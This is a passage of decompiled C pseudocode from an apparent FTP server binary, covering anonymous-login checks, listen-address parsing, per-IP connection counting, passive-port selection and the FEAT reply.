  else
  {
    sub_14BC0(a1[1], a2);
    v8 = (const struct sockaddr *)a1[1];
  }
  v9 = sub_14330(v4, v8, dword_221AB8);
  if ( (unsigned int)sub_13F40(v9) )
  {
    v11 = v4;
    v4 = -1;
    sub_13880(v11);
  }
  return v4;
}
// F7D2: conditional instruction was optimized away because r12d.4==0
// 13F50: using guessed type __int64 sub_13F50(void);
// 14F20: using guessed type __int64 sub_14F20(void);
// 220CA8: using guessed type __int64 qword_220CA8;
// 221A08: using guessed type int dword_221A08;
// 221A60: using guessed type int dword_221A60;
// 221AB8: using guessed type int dword_221AB8;

//----- (000000000000F870) ----------------------------------------------------
int __fastcall sub_F870(__int64 a1)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 24);
  if ( result != -1 )
  {
    result = sub_13880(result);
    *(_DWORD *)(a1 + 24) = -1;
  }
  return result;
}

//----- (000000000000F8A0) ----------------------------------------------------
_BOOL8 __fastcall sub_F8A0(__int64 a1)
{
  return *(_DWORD *)(a1 + 24) != -1;
}

//----- (000000000000F8B0) ----------------------------------------------------
__int64 __fastcall sub_F8B0(__int64 a1, __int64 a2)
{
  unsigned int v3; // eax
  __int64 v4; // rdi
  unsigned __int16 v5; // r12
  unsigned __int16 v6; // r13
  int v7; // eax
  __int64 v8; // rdx
  int v9; // ebx
  __int16 v10; // r14
  __int64 v11; // rdx
  unsigned int v12; // r15d
  unsigned int v13; // eax
  unsigned int v14; // eax
  double v16; // [rsp+8h] [rbp-40h]

  if ( sub_14950(*(_WORD **)a1) )
    v3 = sub_14010();
  else
    v3 = sub_13FC0();
  v4 = v3;
  *(_DWORD *)(a1 + 24) = v3;
  sub_12E40(v3);
  v5 = dword_2219E8;
  v6 = dword_221B84;
  v7 = 1024;
  v8 = 1024LL;
  if ( (unsigned int)(dword_2219E8 - 1025) > 0xFBFE )
    v5 = 1024;
  else
    v7 = dword_2219E8;
  if ( dword_221B84 < (unsigned int)v7 || (unsigned int)dword_221B84 > 0xFFFE )
    v6 = -1;
  v9 = 9;
  v16 = (double)v7;
  while ( 1 )
  {
    v10 = sub_14F20(v4, a2, v8);
    v12 = (int)(((double)v6 - v16 + 1.0)
              * ((double)(unsigned __int16)((v10 << 8) | (unsigned __int8)sub_14F20(v4, a2, v11))
               * 0.0000152587890625)
              + (double)v5);
    sub_147E0((void **)&qword_220CA0, *(_QWORD *)a1);
    sub_14BC0((unsigned __int16 *)qword_220CA0, v12);
    a2 = qword_220CA0;
    v13 = sub_140D0(*(_DWORD *)(a1 + 24), (const struct sockaddr *)qword_220CA0);
    v4 = v13;
    if ( !(unsigned int)sub_13F40(v13) )
    {
      a2 = 1LL;
      v14 = sub_14120(*(_DWORD *)(a1 + 24), 1);
      v4 = v14;
      if ( !(unsigned int)sub_13F40(v14) )
        break;
    }
    if ( (unsigned int)sub_13F50() != 2 && (unsigned int)sub_13F50() != 7 )
      sub_4B80();
    if ( !--v9 )
      sub_4B80();
  }
  return v12;
}
// F940: variable 'v8' is possibly undefined
// F948: variable 'v11' is possibly undefined
// 13F50: using guessed type __int64 sub_13F50(void);
// 14F20: using guessed type __int64 __fastcall sub_14F20(_QWORD, _QWORD, _QWORD);
// 220CA0: using guessed type __int64 qword_220CA0;
// 2219E8: using guessed type int dword_2219E8;
// 221B84: using guessed type int dword_221B84;

//----- (000000000000FA50) ----------------------------------------------------
__int64 __fastcall sub_FA50(__int64 a1)
{
  unsigned int v1; // ebx
  int v3; // edi
  void *vars0[5]; // [rsp+0h] [rbp+0h] BYREF

  vars0[0] = 0LL;
  vars0[1] = (void *)__readfsqword(0x28u);
  sub_14580(vars0);
  v1 = sub_14150(*(_DWORD *)(a1 + 24), vars0[0], dword_221C34);
  if ( (unsigned int)sub_13F40(v1) )
  {
    v1 = -1;
    sub_14550(vars0);
  }
  else if ( dword_221A90 || sub_14880(*(unsigned __int16 **)(a1 + 8), (unsigned __int16 *)vars0[0]) )
  {
    sub_14550(vars0);
  }
  else
  {
    v3 = v1;
    v1 = -2;
    sub_13880(v3);
    sub_14550(vars0);
  }
  return v1;
}
// 221A90: using guessed type int dword_221A90;
// 221C34: using guessed type int dword_221C34;

//----- (000000000000FB10) ----------------------------------------------------
int __fastcall sub_FB10(_DWORD *a1, int a2)
{
  int result; // eax
  int v3; // edx

  sub_13900(a2, (struct stat64 **)&qword_220C98);
  result = sub_13D80(qword_220C98);
  v3 = a1[48];
  if ( result != v3 )
  {
    if ( v3 == -1
      || !sub_13A20(qword_220C98)
      || (unsigned int)sub_13D80(qword_220C98) != a1[46] && (unsigned int)sub_13D80(qword_220C98) != a1[47] )
    {
      sub_4B80();
    }
    return sub_13E00(a2, a1[48], 0xFFFFFFFF);
  }
  return result;
}
// 220C98: using guessed type __int64 qword_220C98;

//----- (000000000000FBC0) ----------------------------------------------------
__int64 __fastcall sub_FBC0(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbp
  unsigned int v3; // ebp
  char v5; // r13
  __int64 v6; // [rsp+10h] [rbp-58h] BYREF
  __int64 v7; // [rsp+18h] [rbp-50h]
  unsigned __int64 v8; // [rsp+28h] [rbp-40h]

  v2 = a1 + 10;
  v8 = __readfsqword(0x28u);
  if ( (unsigned int)sub_C500((__int64)(a1 + 10)) - 1 > 0x7F )
    goto LABEL_2;
  v5 = sub_CEE0((__int64)v2, 0);
  if ( !(unsigned int)sub_134F0(v5) && v5 != 95 && v5 != 46 )
    goto LABEL_2;
  if ( (unsigned int)sub_CF10((__int64)v2)
    || (unsigned int)sub_CFF0((__int64)v2)
    || (unsigned int)sub_C500((__int64)a2) > 0x80 )
  {
    goto LABEL_2;
  }
  if ( !dword_221B80 )
    goto LABEL_13;
  v6 = 0LL;
  v7 = 0LL;
  sub_C3A0((__int64)&v6, (__int64)v2);
  sub_C750((__int64)&v6);
  if ( !sub_C600((__int64)&v6, "FTP") && !sub_C600((__int64)&v6, "ANONYMOUS") )
  {
    sub_C440((__int64)&v6);
LABEL_13:
    if ( !dword_221B50 )
      sub_4B80();
    if ( sub_15AE0(v2, a2) )
    {
      sub_C3A0((__int64)v2, (__int64)v2);
      if ( dword_221C60 )
        sub_F690((__int64)a1, (__int64)v2);
      v3 = 3;
      sub_C1A0(a1, 5u);
LABEL_18:
      sub_C260((__int64)a1, 1);
      if ( dword_221BF8 )
        sub_155D0((double)dword_221BF8);
      return v3;
    }
    goto LABEL_2;
  }
  sub_C440((__int64)&v6);
  if ( (sub_C4F0((__int64)(a1 + 25)) || !(unsigned int)sub_D180((__int64)(a1 + 25), (__int64)a2))
    && (sub_C4F0((__int64)(a1 + 27)) || (unsigned int)sub_D180((__int64)(a1 + 27), (__int64)a2)
                                     && !sub_C4F0((__int64)a2)) )
  {
    sub_C3A0((__int64)(a1 + 12), (__int64)a2);
    if ( sub_C4F0((__int64)(a1 + 12)) )
      sub_C370((__int64)(a1 + 12), "?");
    sub_C8D0((__int64)(a1 + 12), 32, 95);
    sub_C8D0((__int64)(a1 + 12), 10, 63);
    v6 = 0LL;
    v7 = 0LL;
    sub_C370((__int64)&v6, qword_221B58);
    sub_C3A0((__int64)v2, (__int64)&v6);
    if ( dword_221C60 )
      sub_F690((__int64)a1, (__int64)&v6);
    v3 = 2;
    sub_C440((__int64)&v6);
    sub_C440((__int64)(a1 + 25));
    sub_C440((__int64)(a1 + 27));
    sub_C1A0(a1, 5u);
    goto LABEL_18;
  }
LABEL_2:
  sub_C1A0(a1, 5u);
  sub_C260((__int64)a1, 0);
  if ( dword_221ADC )
    sub_155D0((double)dword_221ADC);
  return 1;
}
// 221ADC: using guessed type int dword_221ADC;
// 221B50: using guessed type int dword_221B50;
// 221B80: using guessed type int dword_221B80;
// 221BF8: using guessed type int dword_221BF8;
// 221C60: using guessed type int dword_221C60;

//----- (000000000000FF00) ----------------------------------------------------
__int64 __fastcall sub_FF00(unsigned int a1, unsigned __int8 *a2)
{
  unsigned int v2; // edx
  int v3; // ecx
  __int64 v4; // r9
  unsigned int v5; // eax

  v2 = dword_220CB0;
  if ( dword_220CB0 )
  {
    v3 = 24;
    v4 = (__int64)&a2[dword_220CB0 - 1 + 1];
    v5 = 0;
    do
    {
      v5 ^= *a2 << v3;
      v3 -= 8;
      if ( v3 < 0 )
        v3 = 24;
      ++a2;
    }
    while ( (unsigned __int8 *)v4 != a2 );
    return v5 % a1;
  }
  return v2;
}
// 220CB0: using guessed type int dword_220CB0;

//----- (000000000000FF40) ----------------------------------------------------
__int64 __fastcall sub_FF40(unsigned int a1, _DWORD *a2)
{
  return *a2 % a1;
}

//----- (000000000000FF50) ----------------------------------------------------
unsigned __int64 sub_FF50()
{
  sub_93D0();
  return sub_E110(0LL, 0);
}

//----- (000000000000FF70) ----------------------------------------------------
void __fastcall sub_FF70(const void *a1)
{
  _DWORD *v1; // rax
  _DWORD *v2; // rbx
  int v3; // eax

  v1 = (_DWORD *)sub_10670((unsigned int *)qword_220CC0, a1);
  v2 = v1;
  if ( !v1 )
    sub_4B30("IP address missing from hash");
  v3 = *v1;
  if ( !v3 )
    sub_4B30("zero count for IP address");
  *v2 = v3 - 1;
  if ( v3 == 1 )
    sub_10740((unsigned int *)qword_220CC0, a1);
}
// 220CC0: using guessed type __int64 qword_220CC0;

//----- (000000000000FFF0) ----------------------------------------------------
unsigned __int64 sub_FFF0()
{
  int i; // eax
  const void *v2; // rax
  int v3; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-10h]

  v3 = 1;
  v4 = __readfsqword(0x28u);
  for ( i = 1; i; i = v3 )
  {
    v3 = sub_12D40();
    if ( !v3 )
      break;
    --dword_220CC8;
    v2 = (const void *)sub_10670((unsigned int *)qword_220CB8, &v3);
    sub_FF70(v2);
    sub_10740((unsigned int *)qword_220CB8, &v3);
  }
  return __readfsqword(0x28u) ^ v4;
}
// 12D40: using guessed type __int64 sub_12D40(void);
// 220CB8: using guessed type __int64 qword_220CB8;
// 220CC8: using guessed type int dword_220CC8;

//----- (0000000000010080) ----------------------------------------------------
__int64 sub_10080()
{
  int v0; // r13d
  int v1; // ebx
  const void *v2; // rbp
  int v3; // ebx
  unsigned int v4; // eax
  int v5; // ebp
  unsigned int v6; // ebx
  _WORD *v7; // r12
  _DWORD *v8; // rax
  __int64 v9; // r15
  __pid_t v10; // eax
  _WORD *v12; // [rsp+0h] [rbp-68h] BYREF
  void *v13; // [rsp+8h] [rbp-60h] BYREF
  void *ptr[11]; // [rsp+10h] [rbp-58h] BYREF

  ptr[3] = (void *)__readfsqword(0x28u);
  v12 = 0LL;
  dword_220CB0 = sub_14AF0();
  if ( dword_221A48 )
  {
    if ( dword_221A80 )
      sub_4B80();
    if ( !dword_221BF0 )
      goto LABEL_4;
  }
  else if ( !dword_221BF0 )
  {
LABEL_6:
    v0 = sub_14010();
    goto LABEL_7;
  }
  if ( sub_12C10() > 0 )
    sub_12C90(0);
  sub_15260();
  sub_15210();
  if ( !dword_221A48 )
    goto LABEL_6;
LABEL_4:
  v0 = sub_13FC0();
LABEL_7:
  sub_12E40(v0);
  qword_220CC0 = (__int64)sub_10580(256, dword_220CB0, 4, (__int64)sub_FF00);
  qword_220CB8 = (__int64)sub_10580(256, 4, dword_220CB0, (__int64)sub_FF40);
  if ( dword_221C60 )
    sub_161F0("LISTENER");
  sub_124F0(3, (__int64)sub_FFF0, 0LL, 1u);
  sub_124F0(6, (__int64)sub_FF50, 0LL, 1u);
  if ( dword_221A48 )
  {
    ptr[0] = 0LL;
    sub_147A0(ptr);
    sub_14BC0((unsigned __int16 *)ptr[0], dword_221A88);
    if ( qword_221C68 )
    {
      if ( !sub_14CA0(qword_221C68, (_WORD *)ptr[0]) )
        sub_4BA0("bad listen_address: ", qword_221C68);
    }
    else
    {
      sub_14B40((_WORD *)ptr[0]);
    }
    v1 = sub_140D0(v0, (const struct sockaddr *)ptr[0]);
    sub_12BB0(ptr[0]);
    if ( (unsigned int)sub_13F40(v1) )
      sub_4B80();
  }
  else
  {
    v13 = 0LL;
    sub_147C0(&v13);
    sub_14BC0((unsigned __int16 *)v13, dword_221A88);
    if ( qword_221A10 )
    {
      ptr[0] = 0LL;
      ptr[1] = 0LL;
      sub_C370((__int64)ptr, (const char *)qword_221A10);
      v2 = (const void *)sub_10A30((__int64)ptr);
      sub_C440((__int64)ptr);
      if ( !v2 )
        sub_4BA0("bad listen_address6: ", (const char *)qword_221A10);
      sub_14A10(v13, v2);
    }
    else
    {
      sub_14B40(v13);
    }
    v3 = sub_140D0(v0, (const struct sockaddr *)v13);
    sub_12BB0(v13);
    if ( (unsigned int)sub_13F40(v3) )
      sub_4B80();
  }
  v4 = sub_14120(v0, 32);
  if ( (unsigned int)sub_13F40(v4) )
    sub_4B80();
  sub_14580((void **)&v12);
  while ( 1 )
  {
    do
      v5 = sub_14150(v0, v12, 0);
    while ( (unsigned int)sub_13F40(v5) );
    v6 = ++dword_220CC8;
    v7 = sub_14AB0(v12);
    v8 = (_DWORD *)sub_10670((unsigned int *)qword_220CC0, v7);
    if ( v8 )
    {
      LODWORD(ptr[0]) = *v8 + 1;
      *v8 = ptr[0];
    }
    else
    {
      LODWORD(ptr[0]) = 1;
      sub_10690((unsigned int *)qword_220CC0, v7, ptr);
    }
    v9 = LODWORD(ptr[0]);
    if ( dword_221A30 )
      break;
    LODWORD(ptr[0]) = sub_12C60();
    if ( !LODWORD(ptr[0]) )
      goto LABEL_35;
LABEL_28:
    sub_13880(v5);
    if ( SLODWORD(ptr[0]) <= 0 )
    {
      --dword_220CC8;
      sub_FF70(v7);
    }
    else
    {
      sub_10690((unsigned int *)qword_220CB8, ptr, v7);
    }
  }
  if ( dword_221B68 && dword_221A58 )
  {
    v10 = sub_169C0();
    LODWORD(ptr[0]) = v10;
  }
  else
  {
    v10 = sub_16950();
    LODWORD(ptr[0]) = v10;
  }
  if ( v10 )
    goto LABEL_28;
LABEL_35:
  sub_168D0();
  sub_13880(v0);
  sub_13860(v5, 0);
  sub_13860(v5, 1);
  sub_13860(v5, 2);
  if ( v5 > 2 )
    sub_13880(v5);
  return (v9 << 32) | v6;
}
// 14AF0: using guessed type __int64 sub_14AF0(void);
// 220CB0: using guessed type int dword_220CB0;
// 220CB8: using guessed type __int64 qword_220CB8;
// 220CC0: using guessed type __int64 qword_220CC0;
// 220CC8: using guessed type int dword_220CC8;
// 221A30: using guessed type int dword_221A30;
// 221A48: using guessed type int dword_221A48;
// 221A58: using guessed type int dword_221A58;
// 221A80: using guessed type int dword_221A80;
// 221A88: using guessed type int dword_221A88;
// 221B68: using guessed type int dword_221B68;
// 221BF0: using guessed type int dword_221BF0;
// 221C60: using guessed type int dword_221C60;

//----- (0000000000010580) ----------------------------------------------------
_DWORD *__fastcall sub_10580(int a1, int a2, int a3, __int64 a4)
{
  _DWORD *v6; // rax
  _DWORD *v7; // rbx
  void *v8; // rax

  v6 = sub_12AE0(0x20uLL);
  *v6 = a1;
  v7 = v6;
  v6[1] = a2;
  v6[2] = a3;
  *((_QWORD *)v6 + 2) = a4;
  v8 = sub_12AE0((unsigned int)(8 * a1));
  *((_QWORD *)v7 + 3) = v8;
  sub_13650(v8, 8 * a1);
  return v7;
}

//----- (00000000000105E0) ----------------------------------------------------
__int64 __fastcall sub_105E0(unsigned int *a1)
{
  unsigned int v1; // eax

  v1 = (*((__int64 (__fastcall **)(_QWORD))a1 + 2))(*a1);
  if ( *a1 <= v1 )
    sub_4B30("bad bucket lookup");
  return *((_QWORD *)a1 + 3) + 8LL * v1;
}

//----- (0000000000010620) ----------------------------------------------------
__int64 __fastcall sub_10620(unsigned int *a1, const void *a2)
{
  __int64 v2; // rbx

  v2 = *(_QWORD *)sub_105E0(a1);
  if ( !v2 )
    return 0LL;
  while ( sub_136B0(a2, *(const void **)v2, a1[1]) )
  {
    v2 = *(_QWORD *)(v2 + 24);
    if ( !v2 )
      return 0LL;
  }
  return v2;
}

//----- (0000000000010670) ----------------------------------------------------
__int64 __fastcall sub_10670(unsigned int *a1, const void *a2)
{
  __int64 result; // rax

  result = sub_10620(a1, a2);
  if ( result )
    return *(_QWORD *)(result + 8);
  return result;
}

//----- (0000000000010690) ----------------------------------------------------
__int64 __fastcall sub_10690(unsigned int *a1, const void *a2, const void *a3)
{
  __int64 v5; // rax
  __int64 v6; // r13
  _QWORD *v7; // rax
  size_t v8; // rdi
  _QWORD *v9; // rbx
  void *v10; // rax
  int v11; // edx
  void *v12; // rax
  int v13; // edx
  __int64 result; // rax

  v5 = sub_10620(a1, a2);
  if ( v5 && *(_QWORD *)(v5 + 8) )
    sub_4B30("duplicate hash key");
  v6 = sub_105E0(a1);
  v7 = sub_12AE0(0x20uLL);
  v8 = a1[1];
  v7[2] = 0LL;
  v9 = v7;
  v7[3] = 0LL;
  v10 = sub_12AE0(v8);
  v11 = a1[1];
  *v9 = v10;
  sub_13670(v10, a2, v11);
  v12 = sub_12AE0(a1[2]);
  v13 = a1[2];
  v9[1] = v12;
  sub_13670(v12, a3, v13);
  result = *(_QWORD *)v6;
  if ( *(_QWORD *)v6 )
  {
    v9[3] = result;
    result = *(_QWORD *)v6;
    *(_QWORD *)(*(_QWORD *)v6 + 16LL) = v9;
  }
  *(_QWORD *)v6 = v9;
  return result;
}

//----- (0000000000010740) ----------------------------------------------------
void __fastcall sub_10740(unsigned int *a1, const void *a2)
{
  void **v2; // rax
  void **v3; // rbx
  _QWORD *v4; // rax
  _QWORD *v5; // rax

  v2 = (void **)sub_10620(a1, a2);
  v3 = v2;
  if ( !v2 )
    sub_4B30("hash node not found");
  sub_12BB0(*v2);
  sub_12BB0(v3[1]);
  v4 = v3[2];
  if ( v4 )
    v4[3] = v3[3];
  else
    *(_QWORD *)sub_105E0(a1) = v3[3];
  v5 = v3[3];
  if ( v5 )
    v5[2] = v3[2];
  sub_12BB0(v3);
}

//----- (00000000000107D0) ----------------------------------------------------
void __noreturn sub_107D0()
{
  sub_4B80();
}

//----- (00000000000107F0) ----------------------------------------------------
_BOOL8 __fastcall sub_107F0(char **a1, __int64 a2)
{
  int v2; // eax
  char v3; // r13
  unsigned int v4; // r13d
  int v5; // r12d
  unsigned int v6; // r14d
  unsigned int v7; // r15d
  int v8; // ebp
  unsigned int v9; // eax
  int v10; // eax
  unsigned int v11; // ebp
  int v12; // r12d
  unsigned int i; // r13d
  char v14; // al
  int v15; // eax
  int v16; // edx
  int v18; // ebp
  int v19; // [rsp+0h] [rbp-58h]
  _BOOL4 v20; // [rsp+4h] [rbp-54h]

  sub_C3A0((__int64)&unk_220D10, a2);
  v20 = sub_C4F0((__int64)&unk_220D10);
  if ( v20 )
    return 1;
LABEL_2:
  sub_CD40((__int64)&unk_220D10, (__int64)&unk_220D00, 58);
  if ( !sub_C4F0((__int64)&unk_220D10) )
  {
    v2 = sub_CA70((__int64)&unk_220D10, 46);
    v3 = v2;
    if ( !v2 )
    {
      v11 = 0;
      v12 = sub_C500((__int64)&unk_220D10);
      if ( v12 )
      {
        for ( i = 0; i != v12; ++i )
        {
          v14 = sub_CEE0((__int64)&unk_220D10, i);
          v15 = sub_13460(v14);
          v16 = v15 - 48;
          if ( (unsigned int)(v15 - 48) > 9 )
          {
            if ( (unsigned int)(v15 - 65) > 5 )
              return v20;
            v16 = v15 - 55;
          }
          v11 = v16 | (16 * v11);
          if ( v11 > 0xFFFF )
            return v20;
        }
        v3 = BYTE1(v11);
      }
      sub_C6A0(a1, v3);
      sub_C6A0(a1, v11);
      goto LABEL_26;
    }
    v4 = sub_C500((__int64)&unk_220D10);
    if ( v4 )
    {
      v19 = 0;
      v5 = 0;
      v6 = 1;
      v7 = 0;
      v8 = 0;
      while ( 1 )
      {
        v10 = (char)sub_CEE0((__int64)&unk_220D10, v6 - 1);
        if ( (char)v10 == 46 )
        {
          if ( !v5 )
            return v20;
          if ( v19 == 3 )
            return v20;
          v8 = v7 | (v8 << 8);
          ++v19;
          if ( v4 <= v6 )
            return v20;
          v5 = 0;
          v7 = 0;
        }
        else
        {
          v9 = v10 - 48;
          if ( v9 > 9 )
            return v20;
          v7 = v9 + 10 * v7;
          if ( v7 > 0xFF )
            return v20;
          if ( v4 <= v6 )
          {
            if ( v19 != 3 )
              return v20;
            v18 = v7 | (v8 << 8);
            sub_C6A0(a1, SHIBYTE(v18));
            sub_C6A0(a1, SBYTE2(v18));
            sub_C6A0(a1, SBYTE1(v18));
            sub_C6A0(a1, v18);
LABEL_26:
            sub_C3A0((__int64)&unk_220D10, (__int64)&unk_220D00);
            v20 = sub_C4F0((__int64)&unk_220D10);
            if ( v20 )
              return 1;
            goto LABEL_2;
          }
          v5 = 1;
        }
        ++v6;
      }
    }
  }
  return v20;
}

//----- (0000000000010A30) ----------------------------------------------------
__int64 __fastcall sub_10A30(__int64 a1)
{
  int v1; // ebx
  int v2; // eax
  int v3; // edx
  int v4; // ebx

  sub_C570((__int64)&unk_220D50);
  sub_C570((__int64)&unk_220D40);
  sub_C3A0((__int64)&unk_220D30, a1);
  sub_CC40((__int64)&unk_220D30, (__int64)&unk_220D20, "::");
  if ( !sub_107F0((char **)&unk_220D50, (__int64)&unk_220D30) )
    return 0LL;
  if ( !sub_107F0((char **)&unk_220D40, (__int64)&unk_220D20) )
    return 0LL;
  v1 = sub_C500((__int64)&unk_220D50);
  v2 = sub_C500((__int64)&unk_220D40);
  v3 = v1 + v2;
  if ( (unsigned int)(v1 + v2) > 0x10 )
    return 0LL;
  if ( v2 )
  {
    v4 = 15 - v3;
    if ( v3 != 16 )
    {
      do
      {
        --v4;
        sub_C6A0((char **)&unk_220D50, 0);
      }
      while ( v4 != -1 );
    }
    sub_C660((char **)&unk_220D50, (__int64)&unk_220D40);
  }
  return sub_C510(&unk_220D50);
}

//----- (0000000000010B30) ----------------------------------------------------
_BYTE *__fastcall sub_10B30(__int64 a1, char a2, _BYTE *a3, int a4)
{
  _BYTE *v6; // rbx
  __int64 v7; // r13
  unsigned int v8; // eax

  sub_C3A0((__int64)qword_220CE0, a1);
  if ( a4 )
  {
    v6 = a3;
    v7 = (unsigned int)(a4 - 1);
    do
    {
      sub_CD40((__int64)qword_220CE0, (__int64)&unk_220CD0, a2);
      if ( (unsigned int)v7 > (int)v6 - (int)a3 )
      {
        if ( sub_C4F0((__int64)&unk_220CD0) )
          return 0LL;
      }
      else if ( (_DWORD)v7 == (_DWORD)v6 - (_DWORD)a3 && !sub_C4F0((__int64)&unk_220CD0) )
      {
        return 0LL;
      }
      v8 = sub_D050(qword_220CE0);
      if ( v8 > 0xFF )
        return 0LL;
      *v6++ = v8;
      sub_C3A0((__int64)qword_220CE0, (__int64)&unk_220CD0);
    }
    while ( v6 != &a3[v7 + 1] );
  }
  return a3;
}
// 220CE0: using guessed type _QWORD qword_220CE0[2];

//----- (0000000000010C10) ----------------------------------------------------
_BYTE *__fastcall sub_10C10(__int64 a1)
{
  return sub_10B30(a1, 46, byte_220CF0, 4);
}
// 220CF0: using guessed type _BYTE byte_220CF0[16];

//----- (0000000000010C30) ----------------------------------------------------
_BOOL8 __fastcall sub_10C30(__int64 a1)
{
  _BOOL8 result; // rax
  int v2; // [rsp+8h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  v2 = 0;
  result = 1LL;
  if ( qword_221B18 )
  {
    if ( sub_C4F0((__int64)qword_220D70) )
      sub_C370((__int64)qword_220D70, (const char *)qword_221B18);
    return !sub_A8D0(a1, (__int64)qword_220D70, &v2) && (unsigned int)sub_CA50(a1, qword_220D70) == 0;
  }
  return result;
}
// 220D70: using guessed type _QWORD qword_220D70[2];

//----- (0000000000010CF0) ----------------------------------------------------
_BOOL8 __fastcall sub_10CF0(__int64 a1)
{
  _BOOL8 result; // rax
  int v2; // [rsp+8h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  v2 = 0;
  result = 1LL;
  if ( qword_221AF8 )
  {
    if ( sub_C4F0((__int64)qword_220D60) )
      sub_C370((__int64)qword_220D60, (const char *)qword_221AF8);
    return !sub_A8D0(a1, (__int64)qword_220D60, &v2) && (unsigned int)sub_CA50(a1, qword_220D60) == 0;
  }
  return result;
}
// 220D60: using guessed type _QWORD qword_220D60[2];

//----- (0000000000010DB0) ----------------------------------------------------
int __fastcall sub_10DB0(__int64 a1)
{
  sub_55A0(a1, 211, "Features:");
  if ( dword_221AB0 )
  {
    sub_55E0(a1, " AUTH SSL\r\n");
    sub_55E0(a1, " AUTH TLS\r\n");
  }
  if ( dword_221A78 )
    sub_55E0(a1, " EPRT\r\n");
  if ( dword_221BC4 )
    sub_55E0(a1, " EPSV\r\n");
  sub_55E0(a1, " MDTM\r\n");
  if ( dword_221BC4 )
    sub_55E0(a1, " PASV\r\n");
  if ( dword_221AB0 )
  {
    sub_55E0(a1, " PBSZ\r\n");
    sub_55E0(a1, " PROT\r\n");
  }
  sub_55E0(a1, " REST STREAM\r\n");
  sub_55E0(a1, " SIZE\r\n");
  sub_55E0(a1, " TVFS\r\n");
  sub_55E0(a1, " UTF8\r\n");
  return sub_5560(a1, 211, "End");
}
// 221A78: using guessed type int dword_221A78;
// 221AB0: using guessed type int dword_221AB0;
// 221BC4: using guessed type int dword_221BC4;

//----- (0000000000010F00) ----------------------------------------------------
__int64 sub_10F00()
{
  return 0xFFFFFFFFLL;
}
// 10F00: using guessed type __int64 sub_10F00();

//----- (0000000000010F20) ----------------------------------------------------
__int64 sub_10F20()
{
  return 0xFFFFFFFFLL;
}
// 10F20: using guessed type __int64 sub_10F20();

//----- (0000000000010F40) ----------------------------------------------------
__int64 __fastcall sub_10F40(__int64 a1, __int64 a2, int a3)
{
  return sub_12920(0, a2, a3);
}

//----- (0000000000010F50) ----------------------------------------------------
__int64 __fastcall sub_10F50(__int64 a1, void *a2, size_t a3)
{
  return sub_131C0(0, a2, a3);
}

//----- (0000000000010F60) ----------------------------------------------------
__int64 __fastcall sub_10F60(__int64 a1, _QWORD *a2, int a3)
{
  int v4; // ebx

  if ( a3 == 2 )
  {
    if ( *(_DWORD *)(a1 + 412) )
    {
      if ( *(_DWORD *)(a1 + 456) )
      {
        sub_9070(*(_DWORD *)(a1 + 464), 9);
        sub_91E0(*(_DWORD *)(a1 + 464), a2);
        v4 = sub_9260(*(_DWORD *)(a1 + 464));
        if ( v4 <= 0 )
          return 0xFFFFFFFFLL;
        else
          return (unsigned int)-((unsigned int)sub_C500((__int64)a2) != v4);
      }
      else
      {
        return sub_11330(*(_QWORD *)(a1 + 432), a2);
      }
    }
    else
    {
      return sub_D460(a2, *(_DWORD *)(a1 + 40));
    }
  }
  else if ( *(_DWORD *)(a1 + 408) )
  {
    if ( *(_DWORD *)(a1 + 456) )
    {
      sub_9070(*(_DWORD *)(a1 + 464), 5);
      sub_91E0(*(_DWORD *)(a1 + 464), a2);
      return sub_9260(*(_DWORD *)(a1 + 464));
    }
    else
    {
      return sub_11330(*(_QWORD *)(a1 + 424), a2);
    }
  }
  else
  {
    return sub_D460(a2, 0);
  }
}
// 11330: using guessed type __int64 __fastcall sub_11330(_QWORD, _QWORD);

//----- (0000000000011080) ----------------------------------------------------
__int64 __fastcall sub_11080(unsigned int *a1, void *a2, size_t a3)
{
  unsigned int v3; // r12d
  unsigned int v4; // r13d

  if ( !a1[103] )
    return sub_12840(a1[10], a2, a3);
  if ( !a1[114] )
    return 0xFFFFFFFFLL;
  v3 = a3;
  sub_9070(a1[116], 8);
  v4 = sub_9260(a1[116]);
  sub_92C0(a1[116], (__int64)a2, v3);
  sub_12360(1, v4, a1[10]);
  return v4;
}

//----- (0000000000011110) ----------------------------------------------------
__int64 __fastcall sub_11110(__int64 a1, __int64 a2, int a3)
{
  unsigned int v5; // ebp

  if ( !*(_DWORD *)(a1 + 412) )
    return sub_129A0(*(_DWORD *)(a1 + 40), a2, a3);
  if ( !*(_DWORD *)(a1 + 456) )
    return sub_11320(*(_QWORD *)(a1 + 432));
  sub_9070(*(_DWORD *)(a1 + 464), 9);
  sub_9220(*(_DWORD *)(a1 + 464), a2, a3);
  v5 = sub_9260(*(_DWORD *)(a1 + 464));
  sub_12360(1, v5, *(_DWORD *)(a1 + 40));
  return v5;
}
// 11320: using guessed type __int64 __fastcall sub_11320(_QWORD);

//----- (00000000000111A0) ----------------------------------------------------
__int64 __fastcall sub_111A0(_DWORD *a1, __int64 *a2, _BYTE *a3)
{
  __int64 (__fastcall *v3)(__int64, __int64, int); // rax
  __int64 (__fastcall *v4)(__int64, void *, size_t); // r9
  __int64 result; // rax
  unsigned int v6; // [rsp+Ch] [rbp-1Ch]

  if ( !a1[102] )
  {
    v3 = sub_10F40;
    v4 = sub_10F50;
    return sub_D270(
             (__int64)a1,
             (__int64)a2,
             10,
             a3,
             0x1000u,
             (__int64 (__fastcall *)(__int64, _BYTE *, _QWORD))v4,
             (__int64 (__fastcall *)(__int64, _BYTE *, _QWORD))v3);
  }
  v3 = (__int64 (__fastcall *)(__int64, __int64, int))sub_10F00;
  v4 = (__int64 (__fastcall *)(__int64, void *, size_t))sub_10F20;
  if ( !a1[114] )
    return sub_D270(
             (__int64)a1,
             (__int64)a2,
             10,
             a3,
             0x1000u,
             (__int64 (__fastcall *)(__int64, _BYTE *, _QWORD))v4,
             (__int64 (__fastcall *)(__int64, _BYTE *, _QWORD))v3);
  sub_9070(a1[116], 4);
  result = sub_9260(a1[116]);
  if ( (int)result >= 0 )
  {
    v6 = result;
    sub_9330(a1[116], a2);
    return v6;
  }
  return result;
}
// 10F00: using guessed type __int64 sub_10F00();
// 10F20: using guessed type __int64 sub_10F20();

//----- (0000000000011250) ----------------------------------------------------
int __fastcall sub_11250(__int64 a1)
{
  _BOOL4 v1; // eax
  const char *v2; // rdx
